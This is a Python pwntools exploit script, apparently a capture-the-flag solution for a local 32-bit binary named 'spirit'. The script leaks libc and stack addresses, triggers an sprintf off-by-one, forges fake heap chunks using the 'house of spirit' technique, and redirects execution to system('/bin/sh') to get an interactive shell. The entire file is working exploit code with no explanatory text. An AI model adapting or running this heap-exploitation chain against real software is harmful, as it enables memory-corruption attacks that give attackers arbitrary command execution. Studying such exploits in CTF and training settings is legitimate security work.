from pwn import *

# context.log_level = "debug"

p = process("./spirit")

def do_comment(name, age, reason, comment, skip = False):
    if not skip:
        p.recvuntil("name: ")
        p.send(name)
    p.recvuntil("age: ")
    p.sendline(str(age))
    p.recvuntil("movie? ")
    p.send(reason)
    if not skip:
        p.recvuntil("comment: ")
        p.send(comment)

# leak libc
do_comment("test", 12, "a"*24, "comment")
p.recvuntil("a"*24)
IO_new_file_sync = u32(p.recvn(4))
log.success("leak libc : " + hex(IO_new_file_sync))


system = IO_new_file_sync - 1058832 # local

log.success("system : " + hex(system))

# leak stack
p.recvuntil("<y/n>: ")
p.sendline("y")
do_comment("test", 12, "a"*0x50, "comment")
p.recvuntil("a"*0x50)
stack = u32(p.recvn(4))
log.success("leak stack : " + hex(stack))

# trigger sprintf off by one
p.recvuntil("<y/n>: ")
p.sendline("y")
for i in xrange(8):
    do_comment("test", 12, "reason", "comment")
    p.recvuntil("<y/n>: ")
    p.sendline("y")
for i in xrange(11, 101):
    if i % 10 == 0:
        log.info("adding comment %d..." % i)
    do_comment("test", 12, "reason", "comment", skip = True)
    p.recvuntil("<y/n>: ")
    p.sendline("y")

# house of spirit

fake_heap  = 'b'*12
fake_heap += p32(0x41)
fake_heap += 'c'*(0x40-4)
fake_heap += p32(0x21)
payload  = "a"*0x54
payload += p32(stack-0x60)

log.info("addr stack : " + hex(stack-60))
do_comment("test", 12, fake_heap, payload)
p.recvuntil("<y/n>: ")
# gdb.attach(p, execute = "b *0x080488C9\nb *0x0804868A\nc")
p.sendline("y")
payload  = '/bin/sh\x00'.ljust(0x44, 'a')
payload += p32(system)
payload += p32(0xdeadbeef)
payload += p32(stack-0x60)
payload += p32(0)
payload += p32(0)
do_comment(payload, 12, "reason", "comment")
p.recvuntil("<y/n>: ")
p.sendline("n")
p.interactive()
